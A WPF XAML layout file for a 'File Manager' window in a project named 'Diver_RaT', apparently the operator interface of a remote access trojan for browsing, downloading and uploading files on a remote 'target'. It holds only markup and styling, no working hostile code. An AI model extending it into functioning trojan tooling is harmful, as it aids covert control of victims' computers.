<Window x:Class="Diver_RaT.FileManagerWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
        mc:Ignorable="d"
        xmlns:shell="clr-namespace:System.Windows.Shell;assembly=PresentationFramework"
        xmlns:ui="clr-namespace:Diver_RaT"
        WindowStyle="None"
        ResizeMode="CanResize"
        Title="File Manager" Height="700" Width="920"
        WindowStartupLocation="CenterOwner"
        Background="{StaticResource WindowBgBrush}"
        Foreground="#E6E8EF">

    <WindowChrome.WindowChrome>
        <WindowChrome CaptionHeight="0" GlassFrameThickness="1" ResizeBorderThickness="6"
                      CornerRadius="8" UseAeroCaptionButtons="False"/>
    </WindowChrome.WindowChrome>

    <Grid>
        <Grid.RowDefinitions>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="*"/>
        </Grid.RowDefinitions>
        <ui:CustomTitleBar Grid.Row="0" Title="File Manager"/>
        <Grid Grid.Row="1" Margin="16">
        <Grid.RowDefinitions>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="*"/>
            <RowDefinition Height="Auto"/>
        </Grid.RowDefinitions>

        <StackPanel Grid.Row="0" Orientation="Horizontal" Margin="0,0,0,10">
            <Border Width="12" Height="12" CornerRadius="3" Background="{StaticResource LimeBrush}" VerticalAlignment="Center" Margin="0,0,8,0"/>
            <TextBlock Text="FILE MANAGER" FontSize="15" FontWeight="Bold" Foreground="{StaticResource LimeBrush}" VerticalAlignment="Center"/>
            <TextBlock x:Name="TargetText" FontSize="13" Foreground="{StaticResource MutedBrush}" Margin="10,2,0,0" VerticalAlignment="Center"/>
        </StackPanel>

        <StackPanel Grid.Row="1" Orientation="Horizontal" Margin="0,0,0,8">
            <Button x:Name="UpButton" Content="&#x2191;  Up" Click="UpButton_Click" Padding="12,0" Margin="0,0,8,0" Height="30"/>
            <Button x:Name="RefreshButton" Content="&#x21bb;  Refresh" Click="RefreshButton_Click" Padding="12,0" Margin="0,0,8,0" Height="30"/>
            <Button x:Name="DownloadButton" Content="&#x2193;  Download" Click="DownloadButton_Click" Padding="12,0" Margin="0,0,8,0" Height="30"/>
            <Button x:Name="UploadButton" Content="&#x2191;  Upload" Click="UploadButton_Click" Padding="12,0" Height="30"/>
        </StackPanel>

        <Border Grid.Row="2" Background="{StaticResource PanelGlassBrush}" CornerRadius="8"
                BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="1" Padding="6"
                Margin="0,0,0,8">
            <Grid>
                <Grid.ColumnDefinitions>
                    <ColumnDefinition Width="Auto"/>
                    <ColumnDefinition Width="*"/>
                    <ColumnDefinition Width="Auto"/>
                </Grid.ColumnDefinitions>
                <TextBlock Text="Path" Foreground="{StaticResource MutedBrush}" VerticalAlignment="Center" Margin="6,0,10,0" FontWeight="SemiBold"/>
                <ComboBox x:Name="PathCombo" Grid.Column="1" IsEditable="True"
                          KeyDown="PathCombo_KeyDown" SelectionChanged="PathCombo_SelectionChanged"/>
                <Button x:Name="GoButton" Grid.Column="2" Content="Go" Padding="14,0" Margin="8,0,0,0" Click="GoButton_Click"/>
            </Grid>
        </Border>

        <Border Grid.Row="3" Background="{StaticResource PanelGlassBrush}" CornerRadius="8"
                BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="1">
            <ListView x:Name="FileList" MouseDoubleClick="FileList_MouseDoubleClick"
                      Background="Transparent" BorderThickness="0"
                      ScrollViewer.HorizontalScrollBarVisibility="Disabled">
                <ListView.ItemsPanel>
                    <ItemsPanelTemplate>
                        <WrapPanel/>
                    </ItemsPanelTemplate>
                </ListView.ItemsPanel>
                <ListView.ItemContainerStyle>
                    <Style TargetType="ListViewItem">
                        <Setter Property="Width" Value="118"/>
                        <Setter Property="Height" Value="108"/>
                        <Setter Property="Margin" Value="4"/>
                        <Setter Property="Padding" Value="6"/>
                        <Setter Property="HorizontalContentAlignment" Value="Center"/>
                        <Setter Property="Background" Value="Transparent"/>
                        <Setter Property="Template">
                            <Setter.Value>
                                <ControlTemplate TargetType="ListViewItem">
                                    <Border x:Name="Bd" Background="{TemplateBinding Background}"
                                            CornerRadius="8" Padding="{TemplateBinding Padding}">
                                        <ContentPresenter/>
                                    </Border>
                                    <ControlTemplate.Triggers>
                                        <Trigger Property="IsMouseOver" Value="True">
                                            <Setter TargetName="Bd" Property="Background" Value="#1A2233"/>
                                        </Trigger>
                                        <Trigger Property="IsSelected" Value="True">
                                            <Setter TargetName="Bd" Property="Background" Value="#26324C"/>
                                        </Trigger>
                                    </ControlTemplate.Triggers>
                                </ControlTemplate>
                            </Setter.Value>
                        </Setter>
                    </Style>
                </ListView.ItemContainerStyle>
                <ListView.ItemTemplate>
                    <DataTemplate>
                        <StackPanel>
                            <Image Source="{Binding IconSource}" Width="48" Height="48"
                                   HorizontalAlignment="Center" Margin="0,2,0,6"
                                   RenderOptions.BitmapScalingMode="HighQuality"/>
                            <TextBlock Text="{Binding Name}" FontSize="11.5" Foreground="#E6E8EF"
                                       TextWrapping="Wrap" TextAlignment="Center" MaxHeight="30"
                                       TextTrimming="CharacterEllipsis" ToolTip="{Binding Name}"/>
                            <TextBlock Text="{Binding SizeText}" FontSize="10"
                                       Foreground="{StaticResource MutedBrush}" TextAlignment="Center" Margin="0,2,0,0"/>
                        </StackPanel>
                    </DataTemplate>
                </ListView.ItemTemplate>
            </ListView>
        </Border>

        <TextBlock x:Name="StatusText" Grid.Row="4" Margin="2,8,0,0" FontSize="12"
                   Foreground="{StaticResource MutedBrush}"/>
        </Grid>
        <Border CornerRadius="8" BorderBrush="{StaticResource WindowFrameBrush}" BorderThickness="2"
                Panel.ZIndex="9999" Grid.RowSpan="2" IsHitTestVisible="False"/>
    </Grid>
</Window>
